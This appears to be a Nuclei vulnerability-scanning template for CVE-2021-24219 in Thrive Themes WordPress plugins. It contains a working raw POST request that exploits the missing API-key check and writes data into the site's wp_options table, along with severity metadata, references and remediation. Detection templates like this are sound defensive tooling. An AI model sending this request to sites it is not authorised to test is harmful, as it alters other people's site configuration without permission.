http:
- matchers:
  - part: body
    type: word
    words:
    - td_optin_webhook
  - part: content_type
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /wp-json/td/v1/optin/subscription HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    hook_url={"http:\/\/key":"{{filename}}.php"}&api_key=

    '
id: CVE-2021-24219
info:
  author: DhiyaneshDk
  classification:
    cpe: cpe:2.3:a:thrivethemes:focusblog:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2021-24219
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N
    cvss-score: 5.3
    cwe-id: CWE-306,CWE-284
    epss-percentile: 0.92848
    epss-score: 0.10122
  description: 'The Thrive Optimize WordPress plugin before 1.4.13.3, Thrive Comments
    WordPress plugin before 1.4.15.3, Thrive Headline Optimizer WordPress plugin before
    1.3.7.3, Thrive Leads WordPress plugin before 2.3.9.4, Thrive Ultimatum WordPress
    plugin before 2.3.9.4, Thrive Quiz Builder WordPress plugin before 2.3.9.4, Thrive
    Apprentice WordPress plugin before 2.3.9.4, Thrive Visual Editor WordPress plugin
    before 2.6.7.4, Thrive Dashboard WordPress plugin before 2.3.9.3, Thrive Ovation
    WordPress plugin before 2.4.5, Thrive Clever Widgets WordPress plugin before 1.57.1
    and Rise by Thrive Themes WordPress theme before 2.0.0, Ignition by Thrive Themes
    WordPress theme before 2.0.0, Luxe by Thrive Themes WordPress theme before 2.0.0,
    FocusBlog by Thrive Themes WordPress theme before 2.0.0, Minus by Thrive Themes
    WordPress theme before 2.0.0, Squared by Thrive Themes WordPress theme before
    2.0.0, Voice WordPress theme before 2.0.0, Performag by Thrive Themes WordPress
    theme before 2.0.0, Pressive by Thrive Themes WordPress theme before 2.0.0, Storied
    by Thrive Themes WordPress theme before 2.0.0, Thrive Themes Builder WordPress
    theme before 2.2.4 register a REST API endpoint associated with Zapier functionality.
    While this endpoint was intended to require an API key in order to access, it
    was possible to access it by supplying an empty api_key parameter in vulnerable
    versions if Zapier was not enabled. Attackers could use this endpoint to add arbitrary
    data to a predefined option in the wp_options table.

    '
  impact: 'Unauthenticated attackers can arbitrarily add data to WordPress options
    table via Zapier endpoint, potentially modifying critical site configuration and
    compromising site integrity.

    '
  metadata:
    framework: wordpress
    max-request: 1
    product: focusblog
    vendor: thrivethemes
    verified: true
  name: All Thrive Themes and Plugins - Unauthenticated Option Update
  reference:
  - https://www.wordfence.com/blog/2021/03/recently-patched-vulnerability-in-thrive-themes-actively-exploited-in-the-wild
  - https://wpscan.com/vulnerability/35acd2d8-85fc-4af5-8f6c-224fa7d92900/
  remediation: 'Update all affected Thrive plugins and themes to their latest versions.

    '
  severity: medium
  tags: cve,cve2021,wpscan,wordpress,wp,wp-plugin,thrivethemes,intrusive,vkev,vuln
variables:
  filename: '{{to_lower(rand_text_alpha(5))}}'
